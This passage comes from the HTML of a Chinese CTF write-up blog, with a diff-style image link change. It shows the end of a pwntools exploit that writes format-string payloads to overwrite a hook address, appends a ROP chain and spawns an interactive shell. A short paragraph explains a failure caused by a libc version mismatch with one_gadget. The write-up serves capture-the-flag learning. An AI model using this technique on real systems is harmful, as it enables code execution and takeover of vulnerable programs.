class="number">0x60</span>)+<span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-<span class="number">0x60</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">hook_addr=hook_addr+<span class="number">0x2</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">payload=<span class="string">&#x27;%13$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x082d</span>)+<span class="string">&#x27;c%23$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">40</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#因为前面填充了40字节的数据，而输入的起始地址为0x601060，加上40，就是rop链的位置（最终确定rop链为0x601088）</span></span><br><span class="line">payload+=rop</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#重新获取一下shell</span></span><br><span class="line">p.sendline(<span class="string">&quot;sh&gt;&amp;2&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="/../img/2706180-20220419223111162-935171477.png"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018045.png"></p>
 <h3 id="本地通了，远程没通，应该去考虑libc的问题"><a href="#本地通了，远程没通，应该去考虑libc的问题" class="headerlink" title="本地通了，远程没通，应该去考虑libc的问题"></a>本地通了，远程没通，应该去考虑libc的问题</h3><p>最后本地打通，远程没打通。此时应该意识到可能是libc的问题，而这道题one_gadget又会受到libc的影响。因此应该去考虑下本地patch的libc是否和远程的一样，检查了一下发现，最后的问题出在了libc的小版本不同。最后用buu上的libc去搜索了一下one_gadget，最终成功获取shell。本地当时能成功是因为我patch的一个2.23 libc，又去这个libc里搜了个one_gadget，所以自然是能打通的，但是服务器那边肯定是以它自己的libc为准…</p>
 
     </div>
